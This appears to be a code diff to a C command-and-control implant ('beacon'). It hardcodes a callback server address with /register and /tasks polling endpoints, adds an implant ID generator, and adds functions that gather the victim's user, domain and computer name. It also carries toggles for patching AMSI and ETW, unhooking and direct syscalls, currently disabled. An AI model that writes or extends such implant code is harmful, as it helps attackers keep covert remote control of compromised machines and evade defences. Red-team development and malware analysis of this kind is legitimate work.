@@ -4,6 +4,7 @@
 #include "beacon.h"
 
 extern API g_Api;
+extern PCHAR g_lpId;
 extern PWCHAR g_lpwId;
 extern HMODULE g_hModule;
 
@@ -11,6 +12,23 @@ BOOL UnpackProfile(
     PPROFILE g_Profile
 )
 {
+
+    g_Profile->lpwHost = L"192.168.43.248";
+    g_Profile->lpwUserAgent = L"useragent";
+    g_Profile->lpwRegister = L"/register";
+    g_Profile->lpwPoll = L"/tasks";
+    g_Profile->dwCallbackTimeout = 60000;
+    g_Profile->dwSleepTime = 1;
+
+    g_Profile->bUnHook = FALSE;
+    g_Profile->bSyscalls = FALSE;
+    g_Profile->bEncryptSleep = FALSE;
+    g_Profile->bPatchAmsi = FALSE;
+    g_Profile->bPatchEtw = FALSE;
+    g_Profile->bCleanSleep = FALSE;
+
+    return TRUE;
+
     PBYTE pbBase = (PBYTE)g_hModule, pbPtr = pbBase;
 
     if (!pbPtr || *(WORD*)pbPtr != 'ZM')
@@ -106,13 +124,13 @@ BOOL GenerateId() {
     DWORD dwLen = 32;
     CHAR pCharset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
-    PCHAR lpTmp = HeapAlloc(
+    g_lpId = HeapAlloc(
         GetProcessHeap(),
         HEAP_ZERO_MEMORY,
         dwLen + 1
     );
 
-    if (!lpTmp)
+    if (!g_lpId)
     {
         return FALSE;
     }
@@ -124,10 +142,10 @@ BOOL GenerateId() {
     for (DWORD dwIter = 0; dwIter < dwLen; dwIter++)
     {
         INT iKey = rand() % (int) (sizeof pCharset - 1);
-        lpTmp[dwIter] = pCharset[iKey];
+        g_lpId[dwIter] = pCharset[iKey];
     }
 
-    lpTmp[dwLen] = '\0';
+    g_lpId[dwLen] = '\0';
 
     g_lpwId = HeapAlloc(
         GetProcessHeap(),
@@ -142,7 +160,7 @@ BOOL GenerateId() {
 
     SIZE_T stRet = mbstowcs(
         g_lpwId,
-        lpTmp,
+        g_lpId,
         dwLen
     );
 
@@ -151,11 +169,103 @@ BOOL GenerateId() {
         return FALSE;
     }
 
-    HeapFree(
-        GetProcessHeap(),
-        lpTmp,
-        NULL
-    );
+    // HeapFree(
+    //     GetProcessHeap(),
+    //     lpTmp,
+    //     NULL
+    // );
+
+    return TRUE;
+}
+
+BOOL GetLogonFromToken (
+    HANDLE hToken,
+    PCHAR lpName,
+    PCHAR lpDomain
+)
+{
+
+    #define MAX_NAME 256
+
+    DWORD dwLength  = 0;
+    BOOL bSuccess   = FALSE;
+    PTOKEN_USER ptu = NULL;
+    DWORD dwSize    = MAX_NAME;
+
+    if (NULL == hToken)
+    {
+        return FALSE;
+    }
+
+    if (!GetTokenInformation(hToken, TokenUser, (LPVOID) ptu, 0, &dwLength))
+    {
+        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
+        {
+            return FALSE;
+        }
+
+        ptu = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLength);
+
+        if (ptu == NULL)
+        {
+            return FALSE;
+        }
+    }
+
+    if (!GetTokenInformation(hToken, TokenUser, (LPVOID) ptu, dwLength, &dwLength))
+    {
+      return FALSE;
+    }
+
+    SID_NAME_USE SidType;
+
+    if( !LookupAccountSidA( NULL , ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType ) )
+    {
+        DWORD dwResult = GetLastError();
+
+        if(dwResult == ERROR_NONE_MAPPED)
+        {
+            strcpy (lpName, "NONE_MAPPED" );
+        } else
+        {
+            return FALSE;
+        }
+    } else
+    {
+        bSuccess = TRUE;
+    }
+
+   return bSuccess;
+}
+
+BOOL GetBasicUserInfo(
+    PCHAR lpcUserName,
+    PCHAR lpcDomainName,
+    PCHAR lpsComputerName
+)
+{
+    HANDLE hHeap, hToken = NULL;
+    DWORD  dwCompBufLen  = MAX_PATH;
+
+    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+    {
+        return FALSE;
+    }
+
+    if (!GetLogonFromToken(hToken, lpcUserName, lpcDomainName))
+    {
+        return FALSE;
+    }
+
+    if (!GetComputerNameA(lpsComputerName, &dwCompBufLen))
+    {
+        return FALSE;
+    }
+
+    if (strcmp(lpsComputerName, lpcDomainName) == 0)
+    {
+        strcpy(lpcDomainName, " ");
+    }
 
     return TRUE;
 }
